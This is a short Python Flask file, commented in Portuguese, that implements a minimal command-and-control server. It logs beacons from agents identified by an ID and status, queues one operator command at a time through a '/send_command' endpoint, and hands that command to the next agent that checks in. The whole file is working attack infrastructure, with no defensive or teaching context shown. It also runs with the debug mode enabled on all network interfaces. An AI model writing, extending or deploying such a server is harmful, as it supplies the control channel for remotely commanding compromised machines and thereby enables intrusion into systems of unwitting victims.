# c2_server.py
from flask import Flask, request, jsonify

app = Flask(__name__)

# Guarda o último comando
command_to_send = ""

# Endpoint para receber dados do agente
@app.route('/beacon', methods=['POST'])
def beacon():
    global command_to_send
    data = request.json
    print(f"[+] Beacon recebido de {data['agent_id']}: {data['status']}")
    response = {"command": command_to_send}
    command_to_send = ""  # Depois de enviar, zera o comando
    return jsonify(response)

# Endpoint para enviar um novo comando
@app.route('/send_command', methods=['POST'])
def send_command():
    global command_to_send
    cmd = request.json.get("command")
    command_to_send = cmd
    print(f"[+] Novo comando definido: {command_to_send}")
    return jsonify({"status": "command set"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
